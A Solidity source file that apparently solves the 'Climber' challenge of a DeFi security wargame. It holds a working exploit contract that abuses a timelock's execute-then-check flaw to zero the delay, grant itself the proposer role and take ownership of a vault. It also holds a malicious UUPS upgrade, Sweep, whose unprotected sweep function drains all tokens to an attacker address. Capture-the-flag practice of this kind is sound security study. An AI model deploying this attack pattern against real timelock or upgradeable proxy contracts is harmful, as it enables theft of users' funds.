pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import "./ClimberVault.sol";

contract Sweep is Initializable, OwnableUpgradeable, UUPSUpgradeable {

    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;
    uint256 public constant WAITING_PERIOD = 15 days;

    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() initializer {}

    function initialize() initializer external {
        __Ownable_init();
        __UUPSUpgradeable_init();
    }

    function sweep(address token, address to) external {
        IERC20(token).transfer(to, IERC20(token).balanceOf(address(this)));
    }

    function _authorizeUpgrade(address newImplementation) internal onlyOwner override {
    }
}

contract ClimberExploit {
    ClimberTimelock public timelock;
    ClimberVault public vault;

    constructor(ClimberTimelock _timelock, ClimberVault _vault) {
        timelock = _timelock;
        vault = _vault;
    }

    address[] targets;
    uint256[] values;
    bytes[] dataElements;

    function exploit(IERC20 token, address to) external {
        // Set targets for timelock call
        targets.push(address(timelock));
        targets.push(address(timelock));
        targets.push(address(vault));
        targets.push(address(this));

        // Set values for timelock call
        values.push(0);
        values.push(0);
        values.push(0);
        values.push(0);
        
        // Set timelock delay to 0
        // Allows caller to schedule and execute in the same transaction 
        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", uint64(0)));

        // Grant the PROVIDER_ROLE of the vault to this contract 
        // Allows this contract to call 'schedule()' in timelock contract
        dataElements.push(
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                keccak256("PROPOSER_ROLE"), 
                address(this)
            )
        );

        // Transfer ownership of vault from timelock to this contract
        // Allows this contract to upgrade the vault contract
        dataElements.push(abi.encodeWithSignature("transferOwnership(address)", address(this)));
        
        // Exploit the timelock by scheduling during the execution call
        // This is only possible since the timelock delay was set to 0 earlier
        dataElements.push(abi.encodeWithSignature("schedule()"));

        // Execute calls with timelock contract as msg.sender
        timelock.execute(targets, values, dataElements, bytes32(0));

        // Create a new sweep contract and upgrade the proxy
        // After upgrade, call 'sweep()' to send tokens to attacker
        vault.upgradeToAndCall(address(new Sweep()), abi.encodeWithSignature("sweep(address,address)", token, to));
    }

    function schedule() external {
        timelock.schedule(targets, values, dataElements, bytes32(0));
    }
}